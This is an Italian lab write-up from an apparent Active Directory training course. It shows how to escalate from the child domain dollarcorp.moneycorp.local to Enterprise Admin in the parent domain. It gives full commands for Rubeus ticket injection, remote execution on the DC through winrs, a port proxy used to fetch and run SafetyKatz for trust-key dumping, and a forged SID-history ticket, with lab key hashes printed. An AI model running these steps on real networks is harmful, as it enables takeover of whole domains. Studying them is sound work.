# LEARNING OBJECTIVE18

<figure><img src="../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Using DA access to dollarcorp.moneycorp.local, escalate privileges to\
  Enterprise Admin or DA to the parent domain, moneycorp.local using\
  the domain trust key.

### SVOLGIMENTO

Abbiamo bisogno della <kbd>Trust Key</kbd> per il Trust tra <kbd>dollarcorp e moneycrop</kbd>, che può essere recuperata utilizzando Mimikatz o SafetyKatz.

Avvia un processo con privilegi DA. Esegui il comando seguente da un prompt dei comandi con privilegi elevati:

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

Nel nuovo prompt copiampo il Loader sul DC e lo accediamo con winrs, settiamo il portproxy ed eseguiamo SafetyKatz con il Loader

```powershell
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
```

```powershell
winrs -r:dcorp-dc cmd
```

```powershell
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.60
```

```powershell
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"
```

<figure><img src="../.gitbook/assets/image (123).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (124).png" alt=""><figcaption></figcaption></figure>

Domain: MONEYCORP.LOCAL (mcorp / S-1-5-21-335606122-960912869-3279953914)&#x20;

\[ In ] DOLLARCORP.MONEYCORP.LOCAL -> MONEYCORP.LOCAL&#x20;

&#x20;aes256\_hmac 443994ca4fd5fecce4b98c77d41993f5367eada06bcaf6c107fb287dc3dc452d&#x20;

&#x20;aes128\_hmac f22f0374080ef66c587b1834a8f41702&#x20;

rc4\_hmac\_nt f33d214f70226ccdfcd6a8c706b3fb44



Creiamo un ticket con la SID history degli amministratori aziendali. Esegui il comando seguente in un nuovo prompt amministrativo:

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:f33d214f70226ccdfcd6a8c706b3fb44 /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap
```

<figure><img src="../.gitbook/assets/image (125).png" alt=""><figcaption></figcaption></figure>

Copiare il ticket codificato in base64 sopra riportato e utilizzalo nel seguente comando:

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:http/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket: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
```

<figure><img src="../.gitbook/assets/image (126).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (127).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

Una volta fatto l'inject del ticket, e' possibile accedere a <kbd>mcorp-dc</kbd>

```
winrs -r:mcorp-dc cmd
```

<figure><img src="../.gitbook/assets/image (129).png" alt=""><figcaption></figcaption></figure>
